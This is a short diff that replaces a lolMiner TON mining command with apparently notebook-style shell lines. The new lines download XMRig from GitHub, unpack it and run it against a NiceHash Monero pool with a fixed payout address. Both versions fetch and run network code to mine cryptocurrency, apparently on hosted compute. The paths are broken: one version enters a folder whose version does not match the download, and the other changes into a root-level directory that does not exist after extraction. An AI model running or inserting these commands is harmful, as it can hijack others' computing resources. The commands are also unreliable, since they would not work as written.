@@ -1,1 +1,4 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.53/lolMiner_v1.53_Lin64.tar.gz && cd 1.46a && ./lolMiner -a TON --pool https://server1.whalestonpool.com --user EQAnmEIiTxSoEE4tjSBlicFBy1gU-HCTCdSZNq28hew3Er0S
+! wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz 
+! tar -xf  xmrig-6.18.0-linux-x64.tar.gz
+! cd /xmrig-6.18.0 
+! ./xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 3FRGfpepdearV5GFfVVvrNHZciypGZeYnG -p x -k --coin monero -a rx/0
